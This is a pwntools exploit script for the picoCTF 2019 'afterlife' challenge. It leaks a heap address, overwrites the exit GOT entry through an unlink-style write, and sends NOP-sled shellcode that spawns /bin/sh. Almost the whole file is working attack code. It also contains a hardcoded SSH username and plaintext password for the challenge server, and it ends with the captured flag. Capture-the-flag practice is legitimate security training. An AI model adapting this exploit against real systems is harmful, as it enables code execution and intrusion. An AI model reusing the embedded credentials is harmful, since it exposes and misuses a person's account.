from pwn import *
import sys

if len(sys.argv) < 2:
	r = process(['./afterLife', 'linh'])
else:
	s = ssh(host = '2019shell1.picoctf.com', user= "Linh169", password = "mylinh1006")
	r= s.process(['./vuln', 'linh'], cwd = '/problems/afterlife_3_d7ce2f2a99c4a2a922485a042076039f')
	
raw_input('debug')

r.recvuntil('decimal...')
r.recv(1)
res = r.recv(10)
log.info(res)
leak = int(res)
print "%#x" %leak

exit_got = 0x804d02c
shellcode = p32(exit_got - 12) + p32(leak + 8)
shellcode += asm('''
  jmp sc
  {}
sc:
  nop
  '''.format('nop\n'*50)+shellcraft.i386.linux.sh())

r.sendlineafter('an overflow will not be very useful...', shellcode)

r.interactive()
r.close()

# picoCTF{what5_Aft3r_e5e05866}